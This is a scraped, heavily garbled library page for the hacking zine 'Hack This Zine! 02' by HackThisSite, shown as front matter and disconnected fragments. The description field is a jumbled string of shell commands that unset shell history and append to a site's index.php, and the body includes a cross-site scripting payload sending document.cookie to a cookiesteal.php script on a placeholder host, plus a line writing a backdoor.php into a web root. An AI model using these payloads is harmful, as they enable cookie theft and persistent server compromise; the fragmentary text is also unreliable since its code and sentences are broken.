---
title: "Hack This Zine! 02"
author: "HackThisSite.org"
date: "Mar 16, 2022"
category: "anarchism"
source: "https://theanarchistlibrary.org/library/hackthissite-org-hack-this-zine-02"
source_name: "theanarchistlibrary.org"
cover: ""
page_type: book
mirror_state: none
description: "unset HISTFILE; ./clean.sh; cat >> /var/www/hackthissite.org/html/index.php $cmd\", ); ? ost\">a hist hac ype=\"submit\" value form> ha disruption, coun e The real t o them is pote agentWeapon -f / pfile0 now+1minute afa33. "
tags:
  - "hacking"
  - "hacktivism"
images: []
...
them. Consider using str_replace to convert all  characters to s to prevent people from starting html tags or javascript code blocks. You
...
phpMyFamily , save it on your webserver, and call their script like
...
showname.php?name=freemealert(document.cookie);
...
showname.php?name=freemewindow.navigate("http://www.somehost.com/
cookiesteal.php?thegoods="+document.cookie)
...
while ($i  and >> which will let you
...
is issued like "#include " the preprocessor will look in the directory
...
server is behind some sort of firewall, then you could also echo "" > /path/to/www/root/.page/backdoor.php.
